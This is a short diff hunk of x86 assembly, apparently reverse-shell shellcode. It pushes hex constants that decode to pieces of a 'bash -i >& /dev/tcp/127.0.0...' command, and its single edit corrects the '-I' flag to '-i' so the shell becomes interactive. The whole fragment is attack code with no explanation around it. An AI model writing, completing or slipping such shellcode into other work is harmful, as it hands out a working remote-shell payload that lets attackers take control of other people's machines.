@@ -67,7 +67,7 @@ push $0x302e302e
 push $0x3732312f
 push $0x7063742f
 push $0x7665642f
-push $0x263e492d
+push $0x263e692d
 
 #push $0x20202020
 #xor %ebp, %ebp
